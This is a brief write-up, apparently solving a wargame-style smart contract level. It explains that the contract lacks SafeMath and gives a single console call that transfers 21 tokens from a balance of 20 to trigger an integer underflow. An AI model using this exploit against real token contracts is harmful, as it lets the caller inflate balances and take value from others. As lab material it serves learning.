No safeMath was used in this contract, so we can attack it using underflow.
We start with 20 tokens.
```
await contract.transfer('0x72bBe2Fb4C7d7A514Ea97C83A183b79200544cce', 21)
```
